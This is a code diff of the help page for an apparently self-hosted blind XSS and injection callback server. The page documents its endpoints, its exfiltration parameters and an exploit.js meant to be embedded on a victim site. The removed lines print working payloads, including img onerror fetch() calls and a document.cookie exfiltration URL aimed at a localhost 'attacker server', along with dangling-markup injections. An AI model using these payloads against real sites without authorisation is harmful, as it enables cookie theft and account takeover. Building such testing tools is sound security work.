@@ -5,25 +5,25 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1.0">
 		<link href="/styles/tailwind.css" rel="stylesheet">
 	</head>
-	<body class="bg-gradient-to-l from-teal-400 to-blue-300 ml-10 mt-5 flex flex-col gap-20">
+	<body class="bg-slate-400/90 p-5 md:p-0 md:ml-10 mt-5 flex flex-col gap-20">
 		<!-- <body class="bg-slate-400 ml-10 mt-5 flex flex-col gap-20"></body> -->
 		<nav class="absolute top-0 left-0 p-4 mb-5">
 			<a href="/"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24"><path fill="black" d="m7.825 13l5.6 5.6L12 20l-8-8l8-8l1.425 1.4l-5.6 5.6H20v2z"/></svg></a>
 		</nav>
 		<div>
-			<h1 class="text-5xl font-bold mb-10 mt-10">Get Started</h1>
+			<h1 class="text-5xl font-bold mb-5 mt-10">Get Started</h1>
 			<p class="mb-5">Please make sure that you have set up all your variables inside the .env file before reading</p>
 			<div class="flex space-y-10 flex-col">
 				<div class="flex space-x-5 flex-col text-lg">
 					
-					<h3 class="text-lg font-bold">Endpoints:</h3>
+					<h3 class="text-2xl font-bold leading-7">Endpoints:</h3>
 					<ul>
 						<li><b>/logger/{your_code}</b> : This is where you make normal requests to (for request logging).</li>
 						<li><b>/</b>: This is where you request to generate injection alerts. There are query string parameters such as <span class="text-stone-100">url</span>, <span class="text-stone-100">by</span>, <span class="text-stone-100">code</span>, <span class="text-stone-100">plaintext</span>, <span class="text-stone-100">cookie</span>, and <span class="text-stone-100">b64</span>.</li>
 						<li><b>/exploit.js</b>: This is where the exploit.js file lies, you can link this js file remotely to the victim server with the script tag.</li>
 					</ul>
 				</div>
-				<div class="flex space-x-5 flex-col text-lg">
+				<div class="flex space-x-5 flex-col text-lg leading-7">
 					<b>Parameters:</b>
 					<ul>
 						<li><b>url</b>: Specifies location of the current document/webpage</li>
@@ -39,16 +39,8 @@
 						<li><b>xsend-xss-payload header</b> (This header is used to track which XSS payload was used when detection is successful)</li>
 					</ul>
 				</div>
-				<div class="flex space-x-5 flex-col text-lg">
-					<h3 class="text-lg font-bold">Example URL Formats:</h3>
-					<ul>
-						<li><b>HTML injection</b>: http://localhost:4000/?<span class="text-stone-100">url</span>=https://your-current-webpage&<span class="text-stone-100">code</span>=yourcode&<span class="text-stone-100">by</span>=yourusername&<span class="text-stone-100">plaintext</span>=1234</li>
-						<li><b>XSS (with data exfiltration)</b>: "http://localhost:4000/?<span class="text-stone-100">url</span>="+document.location+"&<span class="text-stone-100">code</span>=yourcode&<span class="text-stone-100">plaintext</span>=XSSed&<span class="text-stone-100">by</span>=yourusername" (send with header, <b>xsend-xss-payload</b> )</li>
-						<li><b>XSS (with cookie exfiltration)</b>: "http://localhost:4000/?<span class="text-stone-100">url</span>="+document.location+"&<span class="text-stone-100">code</span>=yourcode&<span class="text-stone-100">cookie</span>=document.cookie&<span class="text-stone-100">by</span>=yourusername" (send with header, <b>xsend-xss-payload</b> )</li>
-						<li><b>Requesting/Other:</b> http://localhost:4000/logger/<span class="text-stone-100">code</span>=yourcode/<span class="text-stone-100">{anything_goes_here}</span></b></li>
-					</ul>
-				</div>
-				<div class="flex space-x-5 flex-col text-lg">
+				
+				<div class="flex space-x-5 flex-col text-lg leading-8">
 					<h3 class="text-lg font-bold">How to use the alerts webhook:</h3>
 					<ul>
 						<li>1.) You must first decide which action parameter to use <b>plaintext, b64, or cookie, or none (leave blank)</b></li>
@@ -58,7 +50,7 @@
 						<li>5.) Inject this inside of an html tag or javascript code that will make a request to this url</li>
 					</ul>
 				</div>
-				<div class="flex space-x-5 flex-col text-lg">
+				<div class="flex space-x-5 flex-col text-lg leading-8">
 					<h3 class="text-lg font-bold">How to use the logger webhook:</h3>
 					<ul>
 						<li>1.) <b>code</b> is the only required parameter for this</li>
@@ -73,49 +65,12 @@
 						<li>1.) Craft the URL to the JS file <b>http://localhost:4000/exploit.js</b></li>
 						<li>2.) Embed in the script tag <b>&lt;script src="http://localhost:4000/exploit.js"&gt;&lt;/script&gt;</b></li>
 						<br>
-						
 					</ul>
 				</div>
+				<p class="leading-loose md:w-1/4 text-lg">Now you can craft all the links into your XSS/HTML payload or even use it in other injection attacks that supports HTTP requests like some RCE and SSRF contexts. Check the generator here: <a class="text-blue-500" href="javascript:document.location=document.location.origin+'/generate'">Generator</a></p>
 			</div>
 		</div>
-		<div>
-			<div class="leading-8 flex flex-col gap-2 text-lg">
-				<h2 class="text-2xl font-bold mb-1">Instructions for (blind) XSS testing</h2>
-				<ol>
-					<li>1.) Choose any action parameter such as <b>plaintext, b64, or cookie, or none (leave blank)</b></li>
-					<li>2.) In this case, I'll choose plaintext</li>
-					<li>3.) Craft the url with the required parameters to the attacker server: <b>"http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=yourusername&code=yourcode"</b></li>
-					<li>4.) Place it inside the <b>fetch()</b> function: <b>fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal&code=yourcode")</b></li>
-					<li>5.) Have the <b>fetch()</b> function include the required headers: <b>fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal&code=yourcode", {headers: {"xsend-xss-payload":"&lt;img src=x onerror=fetch()&gt;"}})</b></li>
-					<li>6.) Craft a payload for an XSS and insert the crafted url (Example: <b>&lt;img/src="x" onerror='fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal&code=yourcode", {headers: {"xsend-xss-payload":"&lt;img src=x onerror=fetch()&gt;"}})'&gt;)</b></li>
-					<li>7.) Now you can inject this payload and wait for your webhook to receive a request</li>
-					<h3 class="text-lg mt-4 font-bold"> &lt;img src="x" onerror='fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal&code=yourcode", {headers: {"xsend-xss-payload":"&lt;img src=x onerror=fetch()&gt;"}})'&gt;</h3>
-				</ol>
-			</div>
-		</div>
-		<div>
-			<div class="leading-8 leading-8 flex flex-col gap-2 text-lg">
-				<h2 class="text-2xl font-bold mb-1">Instructions for HTML Injection / Dangling Markup Injection</h2>
-				<ol>
-					<li>1.) Choose any action parameter such as <b>plaintext, b64 or none (leave blank)</b></li>
-					<li>2.) In this case, I'll choose plaintext</li>
-					<li>3.) Craft the url with the required parameters to the attacker server: <b>http://localhost:4000/?url=https://your-current-webpage&by=yourusername&code=yourcode&plaintext=</b></li>
-					<li>4.) Craft the payload for dangling markup injection: <b>&lt;img src=http://localhost:4000/?url=https://your-current-webpage&by=yourusername&code=yourcode&plaintext="</b></li>
-					<li>5.) Craft the payload for HTML injection: <b>&lt;img src=http://localhost:4000/?url=https://your-current-webpage&by=yourusername&code=yourcode&plaintext=1234"&gt;</b></li>
-					<li>6.) Craft the payload for src attribute injection: <b>http://localhost:4000/?url=https://your-current-webpage&by=yourusername&code=yourcode&plaintext=1234</b></li>
-					<li>7.) Now you can inject this payload and wait for your webhook to receive a request</li>
-					<h3 class="text-lg mt-4 font-bold">&lt;img src=http://localhost:4000/?url=https://your-current-webpage&code=yourcode&plaintext="test"&gt;</h3>
-				</ol>
-			</div>
-		</div>
-		<div>
-			<div class="leading-8 leading-8 flex flex-col gap-2 text-lg">
-				<h2 class="text-2xl font-bold mb-1">Instructions for Other Blind Attacks / Request Logging</h2>
-				<ol>
-					<li>1.) Make a request to <span class="font-semibold">http://localhost:4000/logger/:code</span></li>
-					<li>2.) You can now see logged requests in your webhook</li>
-				</ol>
-			</div>
+	
 		</div>
 	</body>
 </html>
